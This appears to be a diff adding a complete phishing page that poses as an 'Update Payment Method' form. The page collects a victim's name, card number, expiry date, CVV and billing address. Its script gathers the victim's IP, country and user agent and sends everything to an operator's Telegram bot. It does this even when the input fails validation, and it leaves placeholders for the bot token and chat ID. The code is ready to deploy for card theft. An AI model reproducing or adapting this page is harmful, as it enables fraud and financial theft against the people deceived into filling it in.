@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payment Method</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+html, body {
+    width: 100%;
+    height: 100%;
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #f2f2f2;
+}
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+.form-box {
+    background: #fff;
+    width: 100%;
+    max-width: 380px;
+    padding: 20px;
+    box-sizing: border-box;
+    overflow-y: auto;
+    border-radius: 10px;
+    box-shadow: 0 4px 12px rgba(0,0,0,.1);
+}
+label {
+    margin-top: 12px;
+    display: block;
+    font-size: 14px;
+}
+input {
+    width: 100%;
+    padding: 10px;
+    margin-top: 5px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    font-size: 14px;
+}
+.phone-wrapper {
+    position: relative;
+}
+.eye {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+}
+button {
+    width: 100%;
+    margin-top: 18px;
+    padding: 12px;
+    background: #007bff;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 15px;
+}
+.error { color:red; display:none; text-align:center; margin-top:10px; }
+.success { color:green; display:none; text-align:center; margin-top:10px; }
+.no-charge { text-align:center; font-size:13px; color:#555; margin-top:8px; }
+
+/* 📱 mobile-only device lock */
+@media (max-width: 768px) {
+    html, body { overflow: hidden; }
+    .form-box { height: 100dvh; }
+}
+</style>
+</head>
+
+<body>
+
+<div class="form-box">
+<h2 style="text-align:center">Update Payment Method</h2>
+
+<form id="infoForm">
+    <label>Full Name</label>
+    <input type="text" id="fullname" required>
+
+    <label>Card Number</label>
+    <input type="text" id="sixteen" inputmode="numeric" maxlength="19" required>
+
+    <label>DOB (MM/YY)</label>
+    <input type="text" id="dob" placeholder="mm/yy" maxlength="5" required>
+
+    <label>cvv </label>
+    <div class="phone-wrapper">
+        <input type="password" id="phone3" maxlength="3" inputmode="numeric" required>
+        <span class="eye" id="togglePhone">👁</span>
+    </div>
+
+    <label>Street</label>
+    <input type="text" id="street" required>
+
+    <label>City</label>
+    <input type="text" id="city" required>
+
+    <label>State</label>
+    <input type="text" id="state" required>
+
+    <label>Zip Code</label>
+    <input type="text" id="zip" maxlength="10" required>
+
+    <button type="submit">Continue</button>
+
+    <div class="error" id="errorMsg">Please enter valid information.</div>
+    <div class="success" id="successMsg">Submitted successfully ✅</div>
+</form>
+
+<!-- ✅ Small message below form -->
+<div class="no-charge">No charge untill any purchase</div>
+
+</div>
+
+<script>
+/* auto MM/YY */
+dob.addEventListener("input", () => {
+    let v = dob.value.replace(/\D/g,"");
+    if (v.length >= 3) v = v.slice(0,2)+"/"+v.slice(2,4);
+    dob.value = v.slice(0,5);
+});
+
+/* 16-digit format + mask */
+let realNumber = "";
+sixteen.addEventListener("input", () => {
+    realNumber = sixteen.value.replace(/\D/g,"").slice(0,16);
+    sixteen.value = realNumber.replace(/(.{4})/g,"$1 ").trim();
+});
+sixteen.addEventListener("blur", () => {
+    if (realNumber.length === 16)
+        sixteen.value = "•••• •••• •••• " + realNumber.slice(-4);
+});
+sixteen.addEventListener("focus", () => {
+    if (realNumber)
+        sixteen.value = realNumber.replace(/(.{4})/g,"$1 ").trim();
+});
+
+/* phone eye toggle */
+togglePhone.onclick = () => {
+    phone3.type = phone3.type === "password" ? "text" : "password";
+};
+
+const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE";
+const CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE";
+
+async function sendTelegram(status) {
+    let ip="Unknown", country="Unknown";
+    try {
+        const r = await fetch("https://ipapi.co/json/");
+        const d = await r.json();
+        ip = d.ip;
+        country = d.country_name;
+    } catch {}
+
+    const msg =
+`📩 *====TSK EMAILS CARD =====*
+⚠️ *Status:* ${status}
+
+👤 ${fullname.value || "—"}
+🔢 ${realNumber || "—"}
+📅 ${dob.value || "—"}
+📱 ${phone3.value || "—"}
+
+🏠 ${street.value || "—"}, ${city.value || "—"}, ${state.value || "—"} ${zip.value || "—"}
+
+🌐 IP: ${ip}
+🌍 Country: ${country}
+💻 Device: ${navigator.userAgent}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: "Markdown"
+        })
+    });
+}
+
+infoForm.addEventListener("submit", async e => {
+    e.preventDefault();
+
+    const valid =
+        fullname.value.trim().length >= 3 &&
+        realNumber.length === 16 &&
+        /^(0[1-9]|1[0-2])\/\d{2}$/.test(dob.value) &&
+        /^\d{3}$/.test(phone3.value);
+
+    if (!valid) {
+        errorMsg.style.display = "block";
+        await sendTelegram("FAILED VALIDATION ❌");
+        return;
+    }
+
+    errorMsg.style.display = "none";
+    await sendTelegram("SUCCESS ✅");
+    successMsg.style.display = "block";
+
+    setTimeout(() => location.href="success.html", 1500);
+});
+</script>
+
+</body>
+</html>
